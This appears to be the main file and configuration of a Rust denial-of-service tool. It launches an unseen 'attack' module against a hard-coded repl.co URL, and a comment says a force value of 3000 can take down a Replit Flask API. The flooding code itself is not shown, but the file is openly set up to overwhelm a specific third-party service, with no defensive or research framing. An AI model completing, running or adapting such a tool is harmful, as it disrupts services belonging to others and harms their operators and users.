mod attack;
#[tokio::main]
async fn main() {
    attack::start().await;
}

pub static ATTACK_URL: &str = "https://SecretWindingAttributes.carghai74.repl.co";

pub static FORCE: u128 = 3000;
// 3000 to can take down a replit flask api
